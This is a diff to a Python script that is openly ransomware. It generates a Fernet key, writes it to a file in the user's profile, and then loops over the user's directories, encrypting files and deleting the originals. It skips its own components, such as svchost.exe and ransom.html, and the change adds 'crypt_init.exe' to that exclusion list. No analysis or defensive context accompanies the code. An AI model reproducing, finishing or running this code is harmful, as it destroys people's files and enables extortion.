@@ -6,16 +6,20 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.fernet import Fernet
 import os, sys, socket, wget, struct, ctypes, shutil, base64
+
 # ENVIRONMENT VARIABLE
 letter_drive_path = os.environ["SystemDrive"]
 usr = os.environ["USERNAME"]
+
 usrkey = "{}\\Users\\{}\\{}.key".format(letter_drive_path, usr, usr)
+
 # GENERATE KEY FUNCTION
 def genkey(name):
     global key
     key = Fernet.generate_key()
     with open(usrkey, "wb") as file:
         file.write(key)
+
 # FILE ENCYPTING FUNCTION
 def file_ecrypt(key, name):
     with open(name,'rb') as files:
@@ -31,8 +35,10 @@ def file_ecrypt(key, name):
         os.remove(name)
     except:
         pass
+
 # CALL FUNCTION TO GENERATE KEY
 genkey(usr)
+
 # FOR EVERYTIME ENCRYPTING FILES
 while True:
     # LIST ALL FILES EXTENSIONS AND INVOKE ENCRYPTION FUNCTION
@@ -41,7 +47,7 @@ while True:
         for root, dirs, files in os.walk(user):
             for file in files:
                 my_files = ["GuiCounter.exe", "svchost.exe", "image.jpg", "windows-installer.ico", \
-                "vcruntime140.dll", "python37.dll", "python3.dll", "ransom.html", \
+                "crypt_init.exe", "vcruntime140.dll", "python37.dll", "python3.dll", "ransom.html", \
                 "tk86t.dll", "tcl86t.dll", "library.zip", "tclIndex" ]
                 if not(file in my_files):
                     for ext in file.split("."):
